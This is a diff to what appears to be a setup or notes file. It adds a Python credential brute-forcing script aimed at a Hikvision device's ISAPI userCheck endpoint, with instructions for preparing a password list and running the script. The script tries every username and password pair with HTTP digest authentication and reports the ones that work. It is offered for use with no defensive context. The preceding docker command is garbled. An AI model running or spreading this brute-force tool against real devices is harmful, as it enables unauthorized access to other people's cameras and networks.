@@ -3,3 +3,37 @@ sudo systemctl start docker
 
 
 sudo docker run -t /home/filename -t <ipaddress>
+
+
+///python script //save the credentials as pass.json before execute this commands///
+ ~/pass.json 
+
+import json
+import requests
+from requests.auth import HTTPDigestAuth
+
+TARGET = "192.168.1.4"
+JSON_PATH = "/home/yourusername/pass.json"  # Replace with your actual username
+
+with open(JSON_PATH) as f:
+    data = json.load(f)
+
+for user in data["usernames"]:
+    for pwd in data["passwords"]:
+        try:
+            url = f"http://{TARGET}/ISAPI/Security/userCheck"
+            r = requests.get(url, auth=HTTPDigestAuth(user, pwd), timeout=5)
+            if r.status_code == 200:
+                print(f"\n[+] SUCCESS: {user} / {pwd}")
+                break
+            else:
+                print(f"[-] Failed: {user} / {pwd}", end="\r")
+        except:
+            continue
+
+
+
+//to run.  
+ python3 ~/brute_hikvision.py
+
+
